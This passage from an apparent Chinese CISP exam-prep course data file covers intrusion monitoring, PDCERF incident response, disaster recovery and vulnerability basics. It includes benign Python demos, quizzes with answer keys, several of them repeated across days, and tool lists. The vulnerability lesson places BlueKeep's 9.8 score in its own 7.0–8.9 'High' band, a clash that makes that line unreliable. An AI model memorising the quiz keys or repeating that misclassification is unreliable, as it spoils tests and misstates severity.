      code: ` 简单入侵检测\ndef detect_intrusion(events):\n    alerts = []\n    failed_login_count = 0\n    \n    for event in events:\n        if event["type"] == "login" and event["status"] == "fail":\n            failed_login_count += 1\n    \n    if failed_login_count >= 5:\n        alerts.append({\n            "level": "HIGH",\n            "msg": f"检测到暴力破解: {failed_login_count}次失败登录"\n        })\n    \n    return alerts\n\n# 模拟事件\nevents = [\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n]\n\nalerts = detect_intrusion(events)\nfor alert in alerts:\n    print(f"[{alert['level']}] {alert['msg']}")`,
      description: '演示简单入侵检测',
    },
    quiz: [{"id":"q24-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q24-2","question":"以下关于安全监控的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q24-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q24-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q24-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-25', day: 25, week: 4, title: '事件响应流程',
    objectives: ['理解事件响应概念', '了解响应流程阶段', '掌握处置方法'],
    content: '# 事件响应流程\n\n> 📋 **本节大纲**\u2003PDCERF六阶段详解(P→D→C→E→R→F,含遏制优先原则) | 事件优先级分类P0-P3 | CSIRT团队 | 证据处理\n\n## 概述\n\n事件响应（Incident Response）是安全运营的核心——当安全事件爆发，如何快速有效地"止血+清创+恢复"。PDCERF是全球公认的六阶段响应模型。CISP考试中，每阶段的任务顺序和"遏制优先于根除"的逻辑是重点。\n\n## PDCERF六阶段详解\n\n### P - 准备（Preparation）\n事前的"练兵"：组建CSIRT团队(明确各角色)、制定书面应急响应计划、部署SIEM/EDR等监控工具、建立通报机制(内部+监管部门)、**定期演练**(不演练=没计划)。准备越充分，响应越快。\n\n### D - 检测与分析（Detection & Analysis）\n从SIEM告警、用户报告、外部通报等渠道发现事件。核心工作：判断是真攻击还是误报?危害范围多大?数据是否外泄?攻击还在继续吗?关键是快速准确——误判可能导致错误处置或延误。\n\n### C - 遏制（Containment）\n**"止血"——最紧急的步骤！**\n- 短期遏制(立即)：断网/隔离服务器、封禁攻击IP、冻结被攻破账户\n- 长期遏制(后续)：加固防火墙规则、修补临时漏洞、更换凭据\n- 关键原则：遏制优先于根除——先止血，再清创。不要先花时间研究攻击手法而放任攻击持续。\n\n### E - 根除（Eradication）\n**"清创"：**彻底移除攻击者的所有痕迹——删除恶意软件/后门/Webshell、修补被利用的漏洞(CVE)、重置所有被攻破账户密码、检查是否还有其他后门。确保攻击者无法轻易再次进入。\n\n### R - 恢复（Recovery）\n从干净备份恢复数据和系统→验证完整性(哈希校验)→先恢复最关键系统→逐步上线→持续监控是否有异常→确认完全干净后宣布恢复完成。\n\n### F - 跟进（Follow-up / Lessons Learned）\n事后复盘——事件是怎么发生的?(根本原因)→我们的响应哪里做得好/不好?→流程有什么漏洞需要修复?→更新应急响应计划。形成事件报告存档。\n\n## 事件优先级分类\n\n| 级别 | 定义 | 示例 | 响应要求 |\n|------|------|------|---------|\n| P0 | 重大安全事件 | 核心系统被攻破、大规模数据泄露 | 立即响应，全团队动员 |\n| P1 | 严重事件 | 单系统被入侵、DDoS致服务中断 | 30分钟内启动响应 |\n| P2 | 一般事件 | 钓鱼邮件攻击、恶意软件感染单机 | 4小时内处置 |\n| P3 | 轻微事件 | 端口扫描告警、小幅异常流量 | 24小时内分析 |\n\n## 证据处理原则\n\n如果事件可能演变为法律诉讼，必须保护证据链：\n- **不修改原始数据：**先做磁盘镜像(mirror copy)，在原盘镜像上分析而非在原始盘上操作\n- **证据链记录(Chain of Custody)：**谁在何时接触过证据、做了什么操作——全程书面记录\n- **易失性证据优先：**先收集内存(关机即丢失)→网络连接→进程列表→最后才是硬盘\n\n## \n## 🔴 高频考点\n\n· **PDCERF六步顺序**必须背：P准备→D检测→C遏制→E根除→R恢复→F跟进\n· 最紧急步骤是**C遏制**(止血)——"遏制优先于根除"是第一条铁律\n· 取证时**易失性证据优先**：内存→网络连接→进程列表→硬盘\n## 💜 记忆口诀\n\n· **PDCERF六字**："准-检-堵-清-复-盘"\n· **最紧急**："不先清先堵——先止血再清创"\n· **取证顺序**："先内存(丢得快)→再网络→再进程→最后硬盘"\n学习建议\n- PDCERF六步顺序必须牢记：P→D→C→E→R→F\n- C(遏制)是在发现攻击后最紧急的步骤——"先止血"\n- 易失性证据优先收集是取证的基本规则',
    codeExample: {
      language: 'python',
      code: ` 事件响应状态机\nclass IncidentResponder:\n    def __init__(self):\n        self.stage = "初始状态"\n    \n    def next_stage(self):\n        stages = ["检测", "遏制", "根除", "恢复", "总结"]\n        if self.stage == "初始状态":\n            self.stage = stages[0]\n        elif self.stage in stages[:-1]:\n            self.stage = stages[stages.index(self.stage) + 1]\n        return self.stage\n    \n    def handle_event(self, event_type):\n        actions = {\n            "malware": ["隔离主机", "清除恶意软件", "更新防病毒"],\n            "phishing": ["隔离邮件", "通知用户", "更新规则"],\n            "data_leak": ["隔离系统", "溯源分析", "通知合规"]\n        }\n        return actions.get(event_type, ["分析事件", "采取措施"])\n\nir = IncidentResponder()\nprint("事件响应流程:")\nfor _ in range(5):\n    print(f" -> {ir.next_stage()}")\nprint(f"\\n勒索软件处置: {ir.handle_event('malware')}")`,
      description: '演示事件响应流程',
    },
    quiz: [{"id":"q25-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q25-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q25-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q25-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q25-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-26', day: 26, week: 4, title: '应急响应',
    objectives: ['理解应急响应原则', '了解常见事件处置', '掌握恢复方法'],
    content: '# 应急响应\n\n## 应急响应原则\n\n### 1. 快速响应\n- 时间越短，损失越小\n- 快速决策，快速行动\n\n### 2. 最小影响\n- 尽量减少业务中断\n- 隔离而非停机\n\n### 3. 保护证据\n- 不修改原始系统\n- 保留攻击痕迹\n- 记录所有操作\n\n### 4. 持续沟通\n- 内部通报\n- 客户沟通\n- 监管报告\n\n## 常见安全事件处置\n\n### 1. 勒索软件\n\n#### 识别\n- 文件被加密\n- 出现勒索信息\n- 大量文件重命名\n\n#### 处置\n1. 隔离受影响系统\n2. 识别感染源\n3. 评估损失\n4. 从备份恢复\n5. 修复漏洞\n\n#### 预防\n- 定期备份（离线备份）\n- 员工培训\n- 漏洞修复\n\n### 2. Web应用入侵\n\n#### 识别\n- Web Shell发现\n- 异常登录\n- 网页被篡改\n\n#### 处置\n1. 隔离Web服务器\n2. 分析攻击向量\n3. 清除Web Shell\n4. 修复漏洞\n5. 恢复网站\n\n### 3. 数据泄露\n\n#### 识别\n- 异常数据访问\n- 大量数据导出\n- 外部举报\n\n#### 处置\n1. 阻止数据继续泄露\n2. 溯源分析\n3. 通知受影响方\n4. 合规报告\n\n## 恢复策略\n\n### 1. 从备份恢复\n- 验证备份完整性\n- 恢复到新系统\n- 不覆盖原始证据\n\n### 2. 重建系统\n- 使用可信镜像\n- 重新部署应用\n- 验证系统完整性\n\n### 3. 补偿措施\n- 临时防护措施\n- 加强监控\n- 增加日志级别',
    codeExample: {
      language: 'python',
      code: ` 应急响应决策系统\ndef get_response_actions(event_type, severity):\n    actions = {\n        "ransomware": {\n            "critical": ["立即隔离系统", "断开网络", "启动应急预案"],\n            "high": ["隔离感染主机", "检查扩散情况", "准备恢复"],\n        },\n        "web_intrusion": {\n            "high": ["下线可疑服务", "检查Web Shell", "分析访问日志"],\n        },\n        "phishing": {\n            "medium": ["隔离钓鱼邮件", "通知收件人", "更新邮件规则"],\n        }\n    }\n    return actions.get(event_type, {}).get(severity, ["分析事件", "采取适当措施"])\n\n# 测试\nprint("勒索软件(严重):")\nprint(get_response_actions("ransomware", "critical"))\nprint("\\n钓鱼邮件(中):")\nprint(get_response_actions("phishing", "medium"))`,
      description: '演示应急响应决策',
    },
    quiz: [{"id":"q26-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q26-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q26-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q26-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q26-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-27', day: 27, week: 4, title: '灾难恢复',
    objectives: ['理解灾难恢复概念', '了解DR策略', '掌握BCP要点'],
    content: '# 灾难恢复\n\n## 基本概念\n\n### RTO（恢复时间目标）\n- 灾难发生后，多久恢复业务\n- 例如：4小时\n\n### RPO（恢复点目标）\n- 可接受的数据丢失时间\n- 例如：1小时\n\n### 关系\n- RTO越小，成本越高\n- RPO越小，数据丢失越少\n\n## 灾难类型\n\n### 1. 技术故障\n- 服务器故障\n- 网络中断\n- 数据中心故障\n\n### 2. 人为因素\n- 误操作\n- 恶意破坏\n- 内部攻击\n\n### 3. 自然灾难\n- 火灾、洪水\n- 地震、台风\n\n### 4. 安全事件\n- 勒索软件\n- 大规模入侵\n- DDoS攻击\n\n## 恢复策略\n\n### 1. 冷备（Cold Site）\n- 基础设施就绪\n- 需要部署和配置\n- RTO：数天\n- 成本低\n\n### 2. 温备（Warm Site）\n- 部分设备就绪\n- 数据定期同步\n- RTO：数小时\n- 成本中等\n\n### 3. 热备（Hot Site）\n- 实时数据同步\n- 随时可切换\n- RTO：数分钟\n- 成本高\n\n### 4. 多云/混合云\n- 跨云服务商\n- 高可用性\n- 灵活扩展\n\n## BCP（业务持续性计划）\n\n### BCP内容\n1. 风险评估\n2. 业务影响分析\n3. 恢复策略\n4. 应急组织\n5. 通信计划\n6. 测试和演练\n\n### 关键指标\n- MTBF（平均故障间隔）\n- MTTR（平均修复时间）\n\n## 备份策略\n\n### 备份类型\n1. **完全备份**：备份所有数据\n2. **增量备份**：备份自上次备份后的变化\n3. **差异备份**：备份自上次完全备份后的变化\n\n### 3-2-1原则\n- **3**份副本\n- **2**种介质\n- **1**份异地',
    codeExample: {
      language: 'python',
      code: ` RTO/RPO评估示例\ndef evaluate_dr_strategy(rto_hours, rpo_hours, budget):\n    if rto_hours <= 1 and rpo_hours <= 1:\n        level = "热备"\n    elif rto_hours <= 4 and rpo_hours <= 4:\n        level = "温备"\n    else:\n        level = "冷备"\n    \n    recommendations = {\n        "热备": ["实时数据同步", "自动故障转移", "高可用架构"],\n        "温备": ["定期数据同步", "手动/半自动切换", "快速部署能力"],\n        "冷备": ["定期备份", "详细部署文档", "演练计划"]\n    }\n    return level, recommendations[level]\n\n# 评估\nlevel, recs = evaluate_dr_strategy(rto_hours=2, rpo_hours=2, budget=100000)\nprint(f"策略级别: {level}")\nprint(f"建议措施: {', '.join(recs)}")`,
      description: '演示DR策略评估',
    },
    quiz: [{"id":"q27-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q27-2","question":"以下关于灾难恢复的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q27-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q27-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q27-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-28', day: 28, week: 4, title: '第四周总结与测验',
    objectives: ['回顾第四周知识点', '检验学习成果', '为第五周做准备'],
    content: '# 第四周学习总结\n\n## 本周学习内容\n\n### Day 22: 安全运营概述\n- SOC职能和组成\n- 安全运营流程\n\n### Day 23: 日志管理\n- 日志类型和收集\n- ELK Stack\n- 日志分析方法\n\n### Day 24: 安全监控\n- IDS/IPS区别\n- SIEM系统\n- 告警管理\n\n### Day 25: 事件响应流程\n- 六个阶段：准备→检测→遏制→根除→恢复→总结\n- CSIRT团队\n\n### Day 26: 应急响应\n- 常见事件处置（勒索软件、Web入侵、数据泄露）\n\n### Day 27: 灾难恢复\n- RTO/RPO\n- 冷备/温备/热备\n- 3-2-1备份原则\n\n## 知识要点\n\n| 主题 | 核心内容 |\n|------|----------|\n| SOC | 7x24监控、威胁检测、事件响应 |\n| IDS/IPS | 检测vs阻断 |\n| SIEM | 日志聚合、关联分析、统一告警 |\n| RTO | 恢复时间目标 |\n| RPO | 恢复点目标 |\n| 备份 | 3-2-1原则 |\n\n## 下周预告\n\n第五周将学习漏洞与攻击：\n- 漏洞概述\n- OWASP Top 10\n- 渗透测试\n- 漏洞管理',
    quiz: [{"id":"q28-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q28-2","question":"以下关于第四周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q28-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q28-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q28-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  // ========== Week 5: 漏洞与攻击 ==========
  {
    id: 'day-29', day: 29, week: 5, title: '漏洞概述',
    objectives: ['理解漏洞概念', '了解漏洞类型', '掌握漏洞生命周期'],
    content: '# 漏洞概述\n\n> 📋 **本节大纲**\u2003漏洞四大来源(软件/配置/设计/人为) | CVSS评分体系 | 漏洞生命周期 | CVE/CNVD数据库 | 零日漏洞\n\n## 什么是漏洞\n\n漏洞（Vulnerability）是信息系统在设计、实现、配置或管理中存在的弱点，可能被威胁利用以破坏系统安全性。ISO 27005定义："资产或控制中可能被威胁利用的弱点"。\n\n## 漏洞四大来源分类\n\n**1. 软件漏洞（代码缺陷）：**缓冲区溢出、SQL注入、XSS、使用不安全的函数(strcpy代替strncpy)、竞态条件。根因：开发人员的安全编码意识和技能不足。\n\n**2. 配置漏洞（部署错误）：**默认密码未改(admin/admin)、不必要的服务开启(Telnet/FTP)、云存储桶公开访问、错误权限配置。根因：缺乏安全基线检查。\n\n**3. 设计漏洞（架构缺陷）：**缺少认证机制、无权限分级、信任客户端输入而不验证、身份验证逻辑缺陷。根因：需求分析阶段未考虑安全。\n\n**4. 人为漏洞（Human Factor）：**弱密码、被社会工程学欺骗、误操作删除数据、共享账户。根因：安全意识薄弱。\n\n## CVSS评分体系（必考）\n\nCVSS v3.1将漏洞严重度分为0-10分：\n- **严重(Critical) 9.0-10.0：**可远程利用、无需用户交互、导致完全系统控制。如Log4Shell(CVE-2021-44228, 10.0)\n- **高危(High) 7.0-8.9：**需要一定条件，但影响严重。如BlueKeep(CVE-2019-0708, 9.8)\n- **中危(Medium) 4.0-6.9：**有限影响或利用条件苛刻\n- **低危(Low) 0.1-3.9：**影响小或几乎不可利用\n\n评分维度：攻击向量AV、复杂度AC、权限要求PR、用户交互UI、影响范围S、C/I/A影响\n\n## 漏洞生命周期\n\n**发现** → 研究人员/白帽/厂商发现漏洞\n**报告** → 向厂商或CVE编号机构报告（CNVD/CNNVD）\n**验证** → 厂商确认漏洞存在且可复现\n**修复** → 开发商开发补丁或缓解措施\n**披露** → 负责任披露（给厂商修复时间后再公开）vs 完全披露（立即公开）\n**用户部署** → 最终用户安装补丁或实施缓解\n\n## 关键漏洞数据库\n\n- **CVE（通用漏洞与暴露）：**MITRE运营，为每个漏洞分配全球唯一编号CVE-YYYY-NNNNN\n- **NVD（美国国家漏洞数据库）：**在CVE基础上增加CVSS评分和影响分析\n- **CNVD（国家信息安全漏洞共享平台）：**中国CNCERT运营的漏洞库\n- **CNNVD（中国国家信息安全漏洞库）：**中国信息安全测评中心运营\n\n## 零日漏洞（Zero-Day）\n\n厂商尚未发布补丁的已知漏洞。对攻击者最有价值——利用窗口期无防御。黑市价格可达百万美元(iOS零日远控)。防御：纵深防御+行为检测+最小权限——不能依赖"打补丁"。\n\n## \n## 🔴 高频考点\n\n· CVSS v3.1分值范围：**严重9.0-10.0/高危7.0-8.9/中危4.0-6.9/低危0.1-3.9**\n· CVE(唯一编号)vs NVD(加评分)vs CNVD/CNNVD(中国版)——四个漏洞库定位不同\n· 零日漏洞：厂商未发补丁的已知漏洞——纵深防御+行为检测是唯一办法\n## 💜 记忆口诀\n\n· **CVSS分值**："9-7-4-0 严重到低"\n· **生命周期**："发现→报告→验证→修复→披露→装补丁"\n学习建议\n- CVSS四个严重等级的分值范围(9.0/7.0/4.0/0.1)要记住\n- 漏洞的来源分类(软件/配置/设计/人为)比单个漏洞名称更本质\n- 负责任披露( Responsible Disclosure)是现代安全行业的基本规范',
    codeExample: {
      language: 'python',
      code: ` 漏洞严重程度评估\ndef calculate_severity(cvss_score):\n    if cvss_score >= 9.0:\n        return "严重", "立即修复"\n    elif cvss_score >= 7.0:\n        return "高危", "尽快修复"\n    elif cvss_score >= 4.0:\n        return "中危", "计划修复"\n    elif cvss_score > 0:\n        return "低危", "关注跟踪"\n    else:\n        return "无风险", "无需处理"\n\n# 测试漏洞\nvulns = [("CVE-2024-1234", 9.8), ("CVE-2024-5678", 6.5), ("CVE-2024-9012", 3.2)]\nfor cve, score in vulns:\n    level, action = calculate_severity(score)\n    print(f"{cve}: CVSS {score} -> {level}, {action}")`,
      description: '演示漏洞严重程度评估',
    },
    quiz: [{"id":"q29-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q29-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q29-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q29-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q29-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-30', day: 30, week: 5, title: '常见漏洞类型',
    objectives: ['了解常见漏洞', '理解漏洞原理', '掌握防范方法'],
